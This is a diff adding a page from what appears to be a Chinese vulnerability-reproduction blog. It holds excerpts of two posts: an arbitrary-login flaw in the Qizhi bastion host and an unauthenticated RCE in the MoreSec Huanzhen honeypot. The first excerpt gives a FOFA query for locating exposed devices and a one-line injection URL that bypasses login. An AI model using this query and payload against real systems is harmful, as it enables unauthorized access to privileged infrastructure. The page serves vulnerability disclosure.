+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>齐治堡垒机</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>app=”齐治科技-堡垒机”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞POC为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=shterm</span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0ui00q0y8v13qhlgl54" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-默安/默安 幻阵蜜罐未授权访问 RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.621Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="默安-幻阵蜜罐未授权访问-RCE"><a href="#默安-幻阵蜜罐未授权访问-RCE" class="headerlink" title="默安 幻阵蜜罐未授权访问 RCE"></a>默安 幻阵蜜罐未授权访问 RCE</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>默安 幻阵蜜罐存在部署页面未授权访问 ，可执行任意命令</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>默安 幻阵蜜罐</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>产品页面</p>
+<p>![](/resource/默安-幻阵蜜罐未授权访问-RCE/media/1.png)</p>
+<p>安装页面如下</p>
+<p>默安 幻阵蜜罐![](/resource/默安-幻阵蜜罐未授权访问-RCE/media/2.png)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%BB%98%E5%AE%89/%E9%BB%98%E5%AE%89%20%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20RCE/" data-id="cl5c2r0tg00pyy8v14sgv5tle" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/7/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/9/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
